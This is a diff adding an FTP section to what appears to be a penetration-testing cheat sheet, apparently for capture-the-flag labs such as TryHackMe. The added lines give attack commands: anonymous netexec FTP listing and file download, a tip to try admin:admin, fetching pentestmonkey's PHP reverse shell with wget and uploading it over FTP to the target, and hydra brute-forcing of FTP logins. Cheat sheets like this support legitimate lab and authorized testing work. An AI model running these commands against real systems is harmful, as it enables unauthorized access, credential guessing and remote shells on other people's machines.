@@ -399,6 +399,33 @@ enum4linux <IP>
 rpcclient -N -U '' <IP> -c "enumdomusers" | grep -oP '(?<=user:\[)[^\]]+' > users.txt
 ```
 
+### 🔍 FTP Enumeration
+
+#### **Manual Commands and exploitation**
+
+<pre class="language-sh"><code class="lang-sh">#enumeration
+nxc ftp &#x3C;IP> -u '' -p '' --ls
+#try admin:admin credentials!!!
+
+netexec ftp &#x3C;IP> -u '' -p '' --ls [DIRECTORY]
+
+#Get Files
+netexec ftp &#x3C;IP> -u ''-p '' --get ftp_flag.thm
+
+#Reverse Shell
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
+<strong>
+</strong><strong>#modify IP and port and connect to FTP session
+</strong>ftp &#x3C;target-ip>
+
+# Upload the payload you downloaded and check listener
+ftp> put shell.php
+
+--------
+#bruteforce
+sudo hydra -L users.txt -P '/wordlist' -s 21 ftp://$IP
+</code></pre>
+
 ### 🔍 SMB Enumeration
 
 #### **Manual Commands (netexec)**
